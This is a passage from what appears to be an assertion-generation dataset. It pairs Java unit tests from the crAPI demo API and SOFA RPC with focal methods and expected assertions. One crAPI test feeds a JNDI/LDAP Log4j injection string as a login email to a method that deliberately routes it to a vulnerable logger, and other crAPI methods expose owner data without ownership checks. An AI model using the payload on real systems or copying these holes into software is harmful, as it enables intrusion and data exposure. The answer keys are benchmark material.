registerUser(SignUpForm signUpRequest) { User user; UserDetails userDetails; VehicleDetails vehicleDetails; // Check Number in database if (userRepository.existsByNumber(signUpRequest.getNumber())) { return new CRAPIResponse( UserMessage.NUMBER_ALREADY_REGISTERED + signUpRequest.getNumber(), 403); } // check Number in database if (userRepository.existsByEmail(signUpRequest.getEmail())) { return new CRAPIResponse( UserMessage.EMAIL_ALREADY_REGISTERED + signUpRequest.getEmail(), 403); } // Register new user in Database user = new User( signUpRequest.getEmail(), signUpRequest.getNumber(), encoder.encode(signUpRequest.getPassword()), ERole.ROLE_USER); user = userRepository.save(user); if (user != null) { log.info(""User registered successful with userId {}"", user.getId()); // Creating User Details for same user userDetails = createUserDetails(signUpRequest.getName(), user); if (userDetails != null) { userDetailsRepository.save(userDetails); log.info(""User Details Created successful with userId {}"", userDetails.getId()); }  // Creating User Vehicle vehicleDetails = vehicleService.createVehicle(); if (vehicleDetails != null) { smtpMailServer.sendMail( user.getEmail(), MailBody.signupMailBody( vehicleDetails, (userDetails != null && userDetails.getName() != null ? userDetails.getName() : """")), ""Welcome to crAPI""); return new CRAPIResponse(UserMessage.SIGN_UP_SUCCESS_MESSAGE, 200); } throw new EntityNotFoundException( VehicleDetails.class, UserMessage.ERROR, signUpRequest.getName()); } log.info(""User registration failed {}"", signUpRequest.getEmail()); return new CRAPIResponse(UserMessage.SIGN_UP_FAILED + signUpRequest.getEmail(), 400); }"	assertEquals( userRegistrationService.registerUser(signUpForm).getStatus(), HttpStatus.OK.value())
"resetPassword() { LoginForm loginForm = getDummyLoginForm(); User user = new User(""email@example.com"", ""9798789212"", ""Pass"", ERole.ROLE_USER); CRAPIResponse crapiAPIResponse = new CRAPIResponse(); crapiAPIResponse.setMessage(UserMessage.PASSWORD_GOT_RESET); crapiAPIResponse.setStatus(200); Mockito.doReturn(user).when(userService).getUserFromToken(Mockito.any()); Mockito.when(encoder.encode(Mockito.anyString())).thenReturn(""newPassword""); Mockito.when(userRepository.saveAndFlush(Mockito.any())).thenReturn(user); Assertions.""<AssertPlaceHolder>""; }
resetPassword(LoginForm loginForm, HttpServletRequest request) { User user = getUserFromToken(request); if (user != null) { user.setPassword(encoder.encode(loginForm.getPassword())); userRepository.saveAndFlush(user); return new CRAPIResponse(UserMessage.PASSWORD_GOT_RESET, 200); } throw new EntityNotFoundException(User.class, UserMessage.ERROR, loginForm.getEmail()); }"	assertEquals( userService.resetPassword(loginForm, getMockHttpRequest()).getStatus(), 200)
"UnsupportedEncodingException { LoginForm loginForm = getDummyLoginForm(); String sampleJwtToken = ""sampleToken""; User user = getDummyUser(); Mockito.when(authenticationManager.authenticate(Mockito.any())) .thenReturn( new UsernamePasswordAuthenticationToken(loginForm.getEmail(), loginForm.getPassword())); Mockito.when(jwtProvider.generateJwtToken(Mockito.any())).thenReturn(sampleJwtToken); Mockito.when(userRepository.findByEmail(Mockito.anyString())).thenReturn(getDummyUser()); Mockito.when(userRepository.saveAndFlush(Mockito.any())).thenReturn(user); ResponseEntity<JwtResponse> jwtResponse = userService.authenticateUserLogin(loginForm); Assertions.""<AssertPlaceHolder>""; Mockito.verify(userRepository, Mockito.times(1)).saveAndFlush(Mockito.any()); }
authenticateUserLogin(LoginForm loginForm) throws IOException, BadCredentialsException { JwtResponse jwtResponse = new JwtResponse(); Authentication authentication = null; User user; if (loginForm.getEmail() == null) { jwtResponse.setMessage(UserMessage.EMAIL_NOT_PROVIDED); return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(jwtResponse); } else { if (loginForm.getEmail().contains(""jndi:"")) { if (isLog4jEnabled()) { log.info(""Log4j is enabled""); log.info( ""Log4j Exploit Try With Email: {} with Logger: {}, Main Logger: {}"", loginForm.getEmail(), LOG4J_LOGGER.getClass().getName(), log.getClass().getName()); LOG4J_LOGGER.error(""Log4j Exploit Success With Email: {}"", loginForm.getEmail()); } else { log.info(""Log4j is disabled""); } } user = userRepository.findByEmail(loginForm.getEmail()); if (user == null) { jwtResponse.setMessage(UserMessage.EMAIL_NOT_REGISTERED); } else { if (user.isMfaRequired()) { UserDetails userDetails = userDetailsRepository.findByUser_id(user.getId()); smtpMailServer.sendMail( user.getEmail(), MailBody.mfaMailBody(userDetails), ""Unlock your account""); jwtResponse.setMfaRequired(true); jwtResponse.setMessage(UserMessage.OTP_REQUIRED_MESSAGE); return ResponseEntity.status(HttpStatus.LOCKED).body(jwtResponse); } authentication = authenticationManager.authenticate( new UsernamePasswordAuthenticationToken( loginForm.getEmail(), loginForm.getPassword())); String jwt = jwtProvider.generateJwtToken(user); if (jwt != null) { updateUserToken(jwt, user.getEmail()); JwtResponse jwtResponse1 = new JwtResponse(jwt); jwtResponse1.setMessage(UserMessage.LOGIN_SUCCESSFULL_MESSAGE); return ResponseEntity.status(HttpStatus.OK).body(jwtResponse1); } else { jwtResponse.setMessage(UserMessage.INVALID_CREDENTIALS); } } SecurityContextHolder.getContext().setAuthentication(authentication); } return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(jwtResponse); }"	assertEquals(jwtResponse.getBody().getToken(), sampleJwtToken)
"UnsupportedEncodingException { LoginForm loginForm = getDummyLoginFormByEmail(""${jndi:ldap://127.0.0.1/a}""); String sampleJwtToken = ""sampleToken""; User user = getDummyUser(); when(userService.isLog4jEnabled()).thenReturn(true); // Mockito.when(authenticationManager.authenticate(Mockito.any())) //    .thenReturn( //        new UsernamePasswordAuthenticationToken(loginForm.getEmail(), // loginForm.getPassword())); Mockito.when(jwtProvider.generateJwtToken(Mockito.any())).thenReturn(sampleJwtToken); Mockito.when(userRepository.findByEmail(Mockito.anyString())).thenReturn(getDummyUser()); Mockito.when(userRepository.saveAndFlush(Mockito.any())).thenReturn(user); ResponseEntity<JwtResponse> jwtResponse = userService.authenticateUserLogin(loginForm); Assertions.""<AssertPlaceHolder>""; Mockito.verify(userRepository, Mockito.times(1)).saveAndFlush(Mockito.any()); }
authenticateUserLogin(LoginForm loginForm) throws IOException, BadCredentialsException { JwtResponse jwtResponse = new JwtResponse(); Authentication authentication = null; User user; if (loginForm.getEmail() == null) { jwtResponse.setMessage(UserMessage.EMAIL_NOT_PROVIDED); return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(jwtResponse); } else { if (loginForm.getEmail().contains(""jndi:"")) { if (isLog4jEnabled()) { log.info(""Log4j is enabled""); log.info( ""Log4j Exploit Try With Email: {} with Logger: {}, Main Logger: {}"", loginForm.getEmail(), LOG4J_LOGGER.getClass().getName(), log.getClass().getName()); LOG4J_LOGGER.error(""Log4j Exploit Success With Email: {}"", loginForm.getEmail()); } else { log.info(""Log4j is disabled""); } } user = userRepository.findByEmail(loginForm.getEmail()); if (user == null) { jwtResponse.setMessage(UserMessage.EMAIL_NOT_REGISTERED); } else { if (user.isMfaRequired()) { UserDetails userDetails = userDetailsRepository.findByUser_id(user.getId()); smtpMailServer.sendMail( user.getEmail(), MailBody.mfaMailBody(userDetails), ""Unlock your account""); jwtResponse.setMfaRequired(true); jwtResponse.setMessage(UserMessage.OTP_REQUIRED_MESSAGE); return ResponseEntity.status(HttpStatus.LOCKED).body(jwtResponse); } authentication = authenticationManager.authenticate( new UsernamePasswordAuthenticationToken( loginForm.getEmail(), loginForm.getPassword())); String jwt = jwtProvider.generateJwtToken(user); if (jwt != null) { updateUserToken(jwt, user.getEmail()); JwtResponse jwtResponse1 = new JwtResponse(jwt); jwtResponse1.setMessage(UserMessage.LOGIN_SUCCESSFULL_MESSAGE); return ResponseEntity.status(HttpStatus.OK).body(jwtResponse1); } else { jwtResponse.setMessage(UserMessage.INVALID_CREDENTIALS); } } SecurityContextHolder.getContext().setAuthentication(authentication); } return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(jwtResponse); }"	assertEquals(jwtResponse.getBody().getToken(), sampleJwtToken)
"testUpdateUserToken() { User user = getDummyUser(); String sampleJwt = ""sampleToken""; Mockito.when(userRepository.findByEmail(user.getEmail())).thenReturn(user); Mockito.when(userRepository.saveAndFlush(Mockito.any())).thenReturn(user); userService.updateUserToken(sampleJwt, getDummyUser().getEmail()); Assertions.""<AssertPlaceHolder>""; Mockito.verify(userRepository, Mockito.times(1)).saveAndFlush(Mockito.any()); Mockito.verify(userRepository, Mockito.times(1)).findByEmail(user.getEmail()); }
updateUserToken(String jwt, String email) { User user = userRepository.findByEmail(email); if (user != null) { user.setJwtToken(jwt); userRepository.saveAndFlush(user); } }"	assertEquals(user.getJwtToken(), sampleJwt)
"testUpdateUserPassword() { User user = getDummyUser(); String samplePassword = ""samplePassword""; Mockito.when(userRepository.findByEmail(user.getEmail())).thenReturn(user); Mockito.when(userRepository.saveAndFlush(Mockito.any())).thenReturn(user); userService.updateUserPassword(samplePassword, getDummyUser().getEmail()); Assertions.""<AssertPlaceHolder>""; Mockito.verify(userRepository, Mockito.times(1)).saveAndFlush(Mockito.any()); Mockito.verify(userRepository, Mockito.times(1)).findByEmail(user.getEmail()); }
updateUserPassword(String password, String email) { User user = userRepository.findByEmail(email); if (user != null) { user.setPassword(encoder.encode(password)); userRepository.saveAndFlush(user); } return user; }"	assertEquals(user.getPassword(), encoder.encode(samplePassword))
"loginWithEmailTokenSuccessFull() { ChangeEmailRequest changeEmailRequest = getDummyChangeEmailRequest(); LoginWithEmailToken loginWithEmailToken = getDummyLoginWithEmailToken(); User user = getDummyUser(); String generatedJwt = ""dummyJwt""; changeEmailRequest.setOldEmail(user.getEmail()); Mockito.when(changeEmailRepository.findByEmailToken(loginWithEmailToken.getToken())) .thenReturn(changeEmailRequest); Mockito.when(userRepository.findByEmail(loginWithEmailToken.getEmail())).thenReturn(user); Mockito.doReturn(generatedJwt).when(jwtProvider).generateJwtToken(Mockito.any(User.class)); Assertions.""<AssertPlaceHolder>""; }
loginWithEmailTokenV2(LoginWithEmailToken loginWithEmailToken) { ChangeEmailRequest changeEmailRequest; User user; String jwt; changeEmailRequest = changeEmailRepository.findByEmailToken(loginWithEmailToken.getToken()); user = userRepository.findByEmail(loginWithEmailToken.getEmail()); if (changeEmailRequest != null && user != null && changeEmailRequest.getOldEmail().equalsIgnoreCase(user.getEmail())) { jwt = jwtProvider.generateJwtToken(user); if (jwt != null) { return new JwtResponse(jwt); } } JwtResponse jwtResponse = new JwtResponse(); jwtResponse.setMessage(UserMessage.INVALID_CREDENTIALS); return jwtResponse; }"	assertEquals( userService.loginWithEmailTokenV2(loginWithEmailToken).getToken(), generatedJwt)
"addVehicleDetailsSuccess() { VehicleForm vehicleForm = getDummyVehicleForm(); VehicleDetails vehicleDetails = getDummyVehicleDetails(); User user = getDummyUser(); vehicleDetails.setPincode(vehicleForm.getPincode()); Mockito.when(vehicleDetailsRepository.findByVin(Mockito.anyString())) .thenReturn(vehicleDetails); Mockito.when(userService.getUserFromToken(Mockito.any())).thenReturn(user); Assertions.""<AssertPlaceHolder>""; Mockito.verify(vehicleDetailsRepository, Mockito.times(1)).save(Mockito.any()); }
addVehicleDetails(VehicleForm vehicleForm, HttpServletRequest request) { try { VehicleDetails vehicleDetails = vehicleDetailsRepository.findByVin(vehicleForm.getVin()); if (vehicleDetails != null && vehicleDetails.getPincode().equalsIgnoreCase(vehicleForm.getPincode())) { User user = userService.getUserFromToken(request); if (user != null) { vehicleDetails.setOwner(user); vehicleDetails.setStatus(EStatus.INACTIVE); vehicleDetailsRepository.save(vehicleDetails); log.info(""Success Owner updated in vehicle details""); return true; } } } catch (Exception e) { log.error(""Fail to save vehicle details -> Message: {}"", e); } return false; }"	assertTrue(vehicleService.addVehicleDetails(vehicleForm, getDummyHttpRequest()))
"addVehicleDetailsFailWhenVehicleDetailsNotPresent() { VehicleForm vehicleForm = getDummyVehicleForm(); VehicleDetails vehicleDetails = getDummyVehicleDetails(); vehicleDetails.setPincode(vehicleForm.getPincode()); Mockito.when(vehicleDetailsRepository.findByVin(Mockito.anyString())).thenReturn(null); Assertions.""<AssertPlaceHolder>""; Mockito.verify(vehicleDetailsRepository, Mockito.times(0)).save(Mockito.any()); }
addVehicleDetails(VehicleForm vehicleForm, HttpServletRequest request) { try { VehicleDetails vehicleDetails = vehicleDetailsRepository.findByVin(vehicleForm.getVin()); if (vehicleDetails != null && vehicleDetails.getPincode().equalsIgnoreCase(vehicleForm.getPincode())) { User user = userService.getUserFromToken(request); if (user != null) { vehicleDetails.setOwner(user); vehicleDetails.setStatus(EStatus.INACTIVE); vehicleDetailsRepository.save(vehicleDetails); log.info(""Success Owner updated in vehicle details""); return true; } } } catch (Exception e) { log.error(""Fail to save vehicle details -> Message: {}"", e); } return false; }"	assertFalse(vehicleService.addVehicleDetails(vehicleForm, getDummyHttpRequest()))
"addVehicleDetailsFailWhenVehicleFormPinCodeNotEqualVehicleDetailPinCode() { VehicleForm vehicleForm = getDummyVehicleForm(); VehicleDetails vehicleDetails = getDummyVehicleDetails(); Mockito.when(vehicleDetailsRepository.findByVin(Mockito.anyString())) .thenReturn(vehicleDetails); Assertions.""<AssertPlaceHolder>""; Mockito.verify(vehicleDetailsRepository, Mockito.times(0)).save(Mockito.any()); }
addVehicleDetails(VehicleForm vehicleForm, HttpServletRequest request) { try { VehicleDetails vehicleDetails = vehicleDetailsRepository.findByVin(vehicleForm.getVin()); if (vehicleDetails != null && vehicleDetails.getPincode().equalsIgnoreCase(vehicleForm.getPincode())) { User user = userService.getUserFromToken(request); if (user != null) { vehicleDetails.setOwner(user); vehicleDetails.setStatus(EStatus.INACTIVE); vehicleDetailsRepository.save(vehicleDetails); log.info(""Success Owner updated in vehicle details""); return true; } } } catch (Exception e) { log.error(""Fail to save vehicle details -> Message: {}"", e); } return false; }"	assertFalse(vehicleService.addVehicleDetails(vehicleForm, getDummyHttpRequest()))
"addVehicleFailWhenUserNotPresent() { VehicleForm vehicleForm = getDummyVehicleForm(); VehicleDetails vehicleDetails = getDummyVehicleDetails(); vehicleDetails.setPincode(vehicleForm.getPincode()); Mockito.when(vehicleDetailsRepository.findByVin(Mockito.anyString())) .thenReturn(vehicleDetails); Mockito.when(userService.getUserFromToken(Mockito.any())).thenReturn(null); Assertions.""<AssertPlaceHolder>""; Mockito.verify(vehicleDetailsRepository, Mockito.times(0)).save(Mockito.any()); }
addVehicleDetails(VehicleForm vehicleForm, HttpServletRequest request) { try { VehicleDetails vehicleDetails = vehicleDetailsRepository.findByVin(vehicleForm.getVin()); if (vehicleDetails != null && vehicleDetails.getPincode().equalsIgnoreCase(vehicleForm.getPincode())) { User user = userService.getUserFromToken(request); if (user != null) { vehicleDetails.setOwner(user); vehicleDetails.setStatus(EStatus.INACTIVE); vehicleDetailsRepository.save(vehicleDetails); log.info(""Success Owner updated in vehicle details""); return true; } } } catch (Exception e) { log.error(""Fail to save vehicle details -> Message: {}"", e); } return false; }"	assertFalse(vehicleService.addVehicleDetails(vehicleForm, getDummyHttpRequest()))
"getVehicleDetailsReturnWhenNoVehicleFound() { User user = getDummyUser(); Mockito.when(userService.getUserFromToken(Mockito.any())).thenReturn(user); Mockito.when(vehicleDetailsRepository.findAllByOwner_id(Mockito.anyLong())) .thenReturn(Collections.emptyList()); Assertions.""<AssertPlaceHolder>""; }
getVehicleDetails(HttpServletRequest request) { User user = null; List<VehicleDetails> vehicleDetailsList = null; try { user = userService.getUserFromToken(request); if (user != null) { vehicleDetailsList = vehicleDetailsRepository.findAllByOwner_id(user.getId()); if (vehicleDetailsList != null) { for (VehicleDetails vehicleDetails : vehicleDetailsList) { vehicleDetails.setOwner(null); } return vehicleDetailsList; } else { return Collections.emptyList(); } } } catch (Exception exception) { log.error( ""Fail to get List of vehicle for user->{} -> Message: {}"", user.getEmail(), exception); } throw new CRAPIExceptionHandler( UserMessage.CUSTOM_IO_EXCEPTION, UserMessage.VEHICLE_NOT_FOUND, 500); }"	assertTrue(vehicleService.getVehicleDetails(getDummyHttpRequest()).isEmpty())
"getVehicleLocationNotFoundWhenVehicleDetailsAreNull() { VehicleDetails vehicleDetails = getDummyVehicleDetails(); Mockito.when(vehicleDetailsRepository.findByUuid(vehicleDetails.getUuid())).thenReturn(null); VehicleLocationResponse vehicleLocationResponse = vehicleService.getVehicleLocation(vehicleDetails.getUuid()); Assertions.""<AssertPlaceHolder>""; }
getVehicleLocation(UUID carId) { VehicleDetails vehicleDetails = null; VehicleLocationResponse vehicleLocationForm = null; UserDetails userDetails = null; Random random = new Random(); try { vehicleDetails = vehicleDetailsRepository.findByUuid(carId); if (vehicleDetails != null) { // vehicleDetails = vehicleDetailsRepository.findByVehicleLocation_id(carId); // vehicleDetails.setVehicleLocation(getVehicleLocationList().get(random.nextInt(getVehicleLocationList().size()))); if (vehicleDetails.getOwner() != null) { userDetails = userDetailsRepository.findByUser_id(vehicleDetails.getOwner().getId()); vehicleLocationForm = new VehicleLocationResponse( carId, (userDetails != null ? userDetails.getName() : null), (userDetails != null ? userDetails.getUser().getEmail() : null), vehicleDetails.getVehicleLocation()); return vehicleLocationForm; } } } catch (Exception exception) { log.error(""Fail to get vehicle location-> Message: {}"", exception); } return null; }"	assertNull(vehicleLocationResponse)
"getVehicleLocationNotFoundWhenVehicleDetailsOwnerIsNull() { VehicleDetails vehicleDetails = getDummyVehicleDetails(); vehicleDetails.setOwner(null); Mockito.when(vehicleDetailsRepository.findByUuid(vehicleDetails.getUuid())) .thenReturn(vehicleDetails); VehicleLocationResponse vehicleLocationResponse = vehicleService.getVehicleLocation(vehicleDetails.getUuid()); Assertions.""<AssertPlaceHolder>""; }
getVehicleLocation(UUID carId) { VehicleDetails vehicleDetails = null; VehicleLocationResponse vehicleLocationForm = null; UserDetails userDetails = null; Random random = new Random(); try { vehicleDetails = vehicleDetailsRepository.findByUuid(carId); if (vehicleDetails != null) { // vehicleDetails = vehicleDetailsRepository.findByVehicleLocation_id(carId); // vehicleDetails.setVehicleLocation(getVehicleLocationList().get(random.nextInt(getVehicleLocationList().size()))); if (vehicleDetails.getOwner() != null) { userDetails = userDetailsRepository.findByUser_id(vehicleDetails.getOwner().getId()); vehicleLocationForm = new VehicleLocationResponse( carId, (userDetails != null ? userDetails.getName() : null), (userDetails != null ? userDetails.getUser().getEmail() : null), vehicleDetails.getVehicleLocation()); return vehicleLocationForm; } } } catch (Exception exception) { log.error(""Fail to get vehicle location-> Message: {}"", exception); } return null; }"	assertNull(vehicleLocationResponse)
"includeListTest() {  ProviderConfig providerConfig = new ProviderConfig(); DefaultProviderBootstrap defaultProviderBootstra = new DefaultProviderBootstrap(providerConfig); boolean result = defaultProviderBootstra.inList(""hello1"", ""hello2"", ""hello1""); Assert.""<AssertPlaceHolder>""; }
inList(String includeMethods, String excludeMethods, String methodName) { //判断是否在白名单中 if (!StringUtils.ALL.equals(includeMethods)) { if (!inMethodConfigs(includeMethods, methodName)) { return false; } } //判断是否在黑白单中 if (inMethodConfigs(excludeMethods, methodName)) { return false; } //默认还是要发布 return true;  }"	assertTrue(result)
"excludeListTest() {  ProviderConfig providerConfig = new ProviderConfig(); DefaultProviderBootstrap defaultProviderBootstra = new DefaultProviderBootstrap(providerConfig); boolean result = defaultProviderBootstra.inList(""hello1"", ""hello2"", ""hello2""); Assert.""<AssertPlaceHolder>""; }
inList(String includeMethods, String excludeMethods, String methodName) { //判断是否在白名单中 if (!StringUtils.ALL.equals(includeMethods)) { if (!inMethodConfigs(includeMethods, methodName)) { return false; } } //判断是否在黑白单中 if (inMethodConfigs(excludeMethods, methodName)) { return false; } //默认还是要发布 return true;  }"	assertTrue(!result)
"notInListTest() {  ProviderConfig providerConfig = new ProviderConfig(); DefaultProviderBootstrap defaultProviderBootstra = new DefaultProviderBootstrap(providerConfig); boolean result = defaultProviderBootstra.inList(""hello1"", ""hello2"", ""hello3""); Assert.""<AssertPlaceHolder>""; }
inList(String includeMethods, String excludeMethods, String methodName) { //判断是否在白名单中 if (!StringUtils.ALL.equals(includeMethods)) { if (!inMethodConfigs(includeMethods, methodName)) { return false; } } //判断是否在黑白单中 if (inMethodConfigs(excludeMethods, methodName)) { return false; } //默认还是要发布 return true;  }"	assertTrue(!result)
"PrefixIncludeListTest() {  ProviderConfig providerConfig = new ProviderConfig(); DefaultProviderBootstrap defaultProviderBootstra = new DefaultProviderBootstrap(providerConfig); boolean result = defaultProviderBootstra.inList(""hello1"", ""hello1"", ""hello""); Assert.""<AssertPlaceHolder>""; }
inList(String includeMethods, String excludeMethods, String methodName) { //判断是否在白名单中 if (!StringUtils.ALL.equals(includeMethods)) { if (!inMethodConfigs(includeMethods, methodName)) { return false; } } //判断是否在黑白单中 if (inMethodConfigs(excludeMethods, methodName)) { return false; } //默认还是要发布 return true;  }"	assertTrue(!result)
"Exception { ConsumerConfig consumerConfig = new ConsumerConfig().setProtocol(""bolt""); ConsumerBootstrap bootstrap = Bootstraps.from(consumerConfig); BoltClientProxyInvoker invoker = new BoltClientProxyInvoker(bootstrap); byte actual = invoker.parseSerializeType(RpcConstants.SERIALIZE_HESSIAN2); ""<AssertPlaceHolder>""; }
parseSerializeType(String serialization) { Byte serializeType; if (SERIALIZE_HESSIAN.equals(serialization) || SERIALIZE_HESSIAN2.equals(serialization)) { serializeType = RemotingConstants.SERIALIZE_CODE_HESSIAN; } else if (SERIALIZE_PROTOBUF.equals(serialization)) { serializeType = RemotingConstants.SERIALIZE_CODE_PROTOBUF; } else if (SERIALIZE_JAVA.equals(serialization)) { serializeType = RemotingConstants.SERIALIZE_CODE_JAVA; } else { serializeType = super.parseSerializeType(serialization); } return serializeType; }"	assertEquals(RemotingConstants.SERIALIZE_CODE_HESSIAN, actual)
"getReqClass() { Class req = protobufHelper.getReqClass( ""com.alipay.sofa.rpc.codec.protobuf.ProtoService"", ""echoStr""); Assert.""<AssertPlaceHolder>""; }
getReqClass(String service, String methodName) {  String key = buildMethodKey(service, methodName); Class reqClass = requestClassCache.get(key); if (reqClass == null) { // 读取接口里的方法参数和返回值 String interfaceClass = ConfigUniqueNameGenerator.getInterfaceName(service); Class clazz = ClassUtils.forName(interfaceClass, true); loadProtoClassToCache(key, clazz, methodName); } return requestClassCache.get(key); }"	assertTrue(req == EchoStrReq.class)
"getResClass() { Class res = protobufHelper.getResClass( ""com.alipay.sofa.rpc.codec.protobuf.ProtoService"", ""echoStr""); Assert.""<AssertPlaceHolder>""; }
getResClass(String service, String methodName) { String key = service + ""#"" + methodName; Class reqClass = responseClassCache.get(key); if (reqClass == null) { // 读取接口里的方法参数和返回值 String interfaceClass = ConfigUniqueNameGenerator.getInterfaceName(service); Class clazz = ClassUtils.forName(interfaceClass, true); loadProtoClassToCache(key, clazz, methodName); } return responseClassCache.get(key); }"	assertTrue(res == EchoStrRes.class)
"getReqClass() { Class req = protostuffHelper.getReqClass( ProtostuffService.class.getCanonicalName(), ""echoStr""); Assert.""<AssertPlaceHolder>""; }
getReqClass(String service, String methodName) {  String key = buildMethodKey(service, methodName); Class reqClass = requestClassCache.get(key); if (reqClass == null) { // 读取接口里的方法参数和返回值 String interfaceClass = ConfigUniqueNameGenerator.getInterfaceName(service); Class clazz = ClassUtils.forName(interfaceClass, true); loadProtoClassToCache(key, clazz, methodName); } return requestClassCache.get(key); }"	assertTrue(req == ExampleObj.class)
"getResClass() { Class res = protostuffHelper.getResClass( ProtostuffService.class.getCanonicalName(), ""echoStr""); Assert.""<AssertPlaceHolder>""; }
getResClass(String service, String methodName) { String key = service + ""#"" + methodName; Class reqClass = responseClassCache.get(key); if (reqClass == null) { // 读取接口里的方法参数和返回值 String interfaceClass = ConfigUniqueNameGenerator.getInterfaceName(service); Class clazz = ClassUtils.forName(interfaceClass, true); loadProtoClassToCache(key, clazz, methodName); } return responseClassCache.get(key); }"	assertTrue(res == ExampleObj.class)
"getProviderServiceProperty() { String result = apolloDynamicConfigManager.getProviderServiceProperty(""serviceName"", ""timeout""); Assert.""<AssertPlaceHolder>""; }
getProviderServiceProperty(String service, String key) { return config.getProperty(DynamicConfigKeyHelper.buildProviderServiceProKey(service, key), DynamicHelper.DEFAULT_DYNAMIC_VALUE); }"	assertEquals(DynamicHelper.DEFAULT_DYNAMIC_VALUE, result)
"Exception { boolean error = false; try { new ExcludeRouter(""*"").route(null, null); } catch (Exception e) { error = e instanceof UnsupportedOperationException; } Assert.""<AssertPlaceHolder>""; }
route(SofaRequest request, List<ProviderInfo> providerInfos) { throw new UnsupportedOperationException(); }"	assertTrue(error)
"Exception { Assert.""<AssertPlaceHolder>""; }
getExcludeName() { return excludeName; }"	"assertEquals(""*"", new ExcludeRouter(""*"").getExcludeName())"
"test() { ProviderInfo provider = ProviderInfo.valueOf(""bolt://10.15.232.229:12222""); Assert.""<AssertPlaceHolder>""; }
toUrl() { return ProviderHelper.toUrl(this); }"	"assertEquals(""bolt://10.15.232.229:12222"", provider.toUrl())"
"buildProviderChain() { ConsumerConfig config = new ConsumerConfig(); config.setBootstrap(""test""); ArrayList<Router> list = new ArrayList<Router>(); config.setRouter(Arrays.asList(""testChainRouter0"", ""-testChainRouter8"")); list.add(new TestChainRouter1()); list.add(new TestChainRouter2()); list.add(new TestChainRouter3()); list.add(new TestChainRouter4()); list.add(new ExcludeRouter(""-testChainRouter5"")); config.setRouterRef(list);  ConsumerBootstrap consumerBootstrap = Bootstraps.from(config); RouterChain chain = RouterChain.buildConsumerChain(consumerBootstrap);  // build test data SofaRequest request = new SofaRequest(); request.setMethodArgs(new String[] { ""xxx"" }); request.setInvokeType(""sync""); List<ProviderInfo> providerInfos = new ArrayList<ProviderInfo>(); ProviderInfo providerInfo = new ProviderInfo(); providerInfo.setHost(""127.0.0.1""); providerInfo.setPort(12200); providerInfos.add(providerInfo);  chain.route(request, providerInfos); Assert.""<AssertPlaceHolder>""; }
route(SofaRequest request, List<ProviderInfo> providerInfos) { for (Router router : routers) { providerInfos = router.route(request, providerInfos); } return providerInfos; }"	"assertEquals(""r0>r7>r2>r4"", RpcInternalContext.getContext().getAttachment(RpcConstants.INTERNAL_KEY_ROUTER_RECORD))"
"getAliasByCode() { Assert.""<AssertPlaceHolder>""; }
getAliasByCode(byte code) { return TYPE_CODE_MAP.getKey(code); }"	"assertEquals(""test"", SerializerFactory.getAliasByCode((byte) 117))"
"getCpuCores() { Assert.""<AssertPlaceHolder>""; }
getCpuCores() { // 找不到文件或者异常，则去物理机的核心数 int cpu = RpcConfigs.getIntValue(RpcOptions.SYSTEM_CPU_CORES); return cpu > 0 ? cpu : Runtime.getRuntime().availableProcessors(); }"	assertTrue(SystemInfo.getCpuCores() > 0)
"getLocalHost() { Assert.""<AssertPlaceHolder>""; }
getLocalHost() { return LOCALHOST; }"	assertNotNull(SystemInfo.getLocalHost())
"testClassCache() { ReflectCache.putClassCache(TestInterface.class.getCanonicalName(), TestInterface.class); Assert.""<AssertPlaceHolder>""; }
getClassCache(String typeStr) { ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); if (classLoader == null) { return null; } else { Map<ClassLoader, Class> temp = CLASS_CACHE.get(typeStr); return temp == null ? null : temp.get(classLoader); } }"	assertEquals(TestInterface.class, ReflectCache.getClassCache(TestInterface.class.getCanonicalName()))
"testTypeStrCache() { ReflectCache.putTypeStrCache(TestInterface.class, TestInterface.class.getCanonicalName()); Assert.""<AssertPlaceHolder>""; }
getTypeStrCache(Class clazz) { return TYPE_STR_CACHE.get(clazz); }"	assertEquals(TestInterface.class.getCanonicalName(), ReflectCache.getTypeStrCache(TestInterface.class))
"checkNormal() { ConfigValueHelper.checkNormal(""aaa"", ""123abc-_.""); try { ConfigValueHelper.checkNormal(""aaa"", ""123abc-_.!""); Assert.fail(); } catch (Exception e) { Assert.""<AssertPlaceHolder>""; } }
checkNormal(String configKey, String configValue) throws SofaRpcRuntimeException { checkPattern(configKey, configValue, NORMAL, ""only allow a-zA-Z0-9 '-' '_' '.'""); }"	"assertTrue(e.getMessage().contains(""aaa""))"
"checkNormalWithColon() { ConfigValueHelper.checkNormalWithColon(""aaa"", ""123abc-_.:""); try { ConfigValueHelper.checkNormalWithColon(""aaa"", ""123abc-_.:!""); Assert.fail(); } catch (Exception e) { Assert.""<AssertPlaceHolder>""; } }
checkNormalWithColon(String configKey, String configValue) throws SofaRpcRuntimeException { checkPattern(configKey, configValue, NORMAL_COLON, ""only allow a-zA-Z0-9 '-' '_' '.' ':'""); }"	"assertTrue(e.getMessage().contains(""aaa""))"
"checkNotNegativeInteger() { ConfigValueHelper.checkNotNegativeInteger(""aaa"", 1); ConfigValueHelper.checkNotNegativeInteger(""aaa"", 0); try { ConfigValueHelper.checkNotNegativeInteger(""aaa"", -1); Assert.fail(); } catch (Exception e) { Assert.""<AssertPlaceHolder>""; } }
checkNotNegativeInteger(String configKey, int configValue) throws SofaRpcRuntimeException { if (configValue < 0) { throw ExceptionUtils.buildRuntime(configKey, configValue + """", ""must >= 0""); } }"	"assertTrue(e.getMessage().contains(""aaa""))"
"Exception { Assert.""<AssertPlaceHolder>""; }
isShuttingDown() { return shuttingDown; }"	assertEquals(RpcRunningState.isShuttingDown(), RpcRunningState.shuttingDown)
"Exception { Assert.""<AssertPlaceHolder>""; }
isUnitTestMode() { return unitTestMode; }"	assertEquals(RpcRunningState.isUnitTestMode(), RpcRunningState.unitTestMode)
"Exception { Assert.""<AssertPlaceHolder>""; }
isDebugMode() { return debugMode; }"	assertEquals(RpcRunningState.isDebugMode(), RpcRunningState.debugMode)
"testToString() { SofaResponse response = new SofaResponse(); Assert.""<AssertPlaceHolder>""; }
toString() { StringBuilder sb = new StringBuilder(128); sb.append(""SofaResponse[""); sb.append(""sofa-rpc exception="").append(isError).append("", ""); sb.append(""sofa-rpc errorMsg="").append(errorMsg).append("", ""); sb.append(""appResponse="").append(appResponse).append(""]""); return sb.toString(); }"	assertNotNull(response.toString())
"Exception { Assert.""<AssertPlaceHolder>""; }
